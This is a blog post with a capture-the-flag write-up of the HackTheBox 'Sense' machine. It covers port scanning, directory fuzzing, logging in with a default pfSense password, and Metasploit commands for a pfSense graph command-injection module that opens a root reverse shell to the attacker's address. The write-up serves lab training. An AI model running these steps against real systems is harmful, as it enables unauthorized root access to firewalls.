---
layout: post
title:  "HTB Sense Machine Writeup"
date:   2020-1-2 00:10:00 +0000
categories: hackthebox
---
Sense was another box that you can smash out in 10 minutes you might have spare. Not much to be learnt from this one as it was very straight forward.

# Nmap scan
```
PORT STATE SERVICE VERSION
80/tcp open http lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open ssl/https?
|_ssl-date: TLS randomness does not represent time
```
Navigating to the webserver we get shown a pfsense login page and not much else.

# Wfuzz results
```
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hc 404,301 https://10.10.10.60/FUZZ.txt
001197: C=200 9 L 40 W 271 Ch "changelog"
112347: C=200 6 L 12 W 106 Ch "system-users"
```
Changelog indicates the current version is vulnerable to something. system-users indicates the username 'rohit' and 'company-default' exist. Trying the username rohit and pfsense default password of 'pfsense' lets us in.

# Exploitation
Searching for an exploit with this platform returns a metasploit module that fits our needs, filling in the details we know we can run the exploit.
```
msf exploit(unix/http/pfsense_graph_injection_exec) > set RHOST 10.10.10.60
RHOST => 10.10.10.60
msf exploit(unix/http/pfsense_graph_injection_exec) > set USERNAME rohit
USERNAME => rohit
msf exploit(unix/http/pfsense_graph_injection_exec) > set LHOST tun0
LHOST => 10.10.14.6
msf exploit(unix/http/pfsense_graph_injection_exec) > exploit
```
<br>
The above exploit yields a root level shell so theres no need to extend privileges.


